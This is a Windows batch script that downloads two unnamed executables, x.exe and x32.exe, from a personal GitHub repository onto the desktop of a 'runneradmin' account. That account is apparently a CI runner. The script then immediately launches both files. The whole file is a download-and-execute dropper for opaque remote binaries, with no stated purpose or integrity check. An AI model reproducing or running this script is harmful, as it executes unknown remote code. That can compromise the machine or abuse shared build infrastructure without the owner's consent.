@echo off
REM Download x.exe and x32.exe using curl

REM Download x.exe
curl -L -o "C:\Users\runneradmin\Desktop\x.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe"

REM Download x32.exe
curl -L -o "C:\Users\runneradmin\Desktop\x32.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x32.exe"

REM Open cmd, go to Desktop directory, and execute x.exe and x32.exe
start cmd /k "cd /d C:\Users\runneradmin\Desktop && echo Executing x.exe && start x.exe && echo Executing x32.exe && start x32.exe"

REM Pause to keep the batch window open
pause
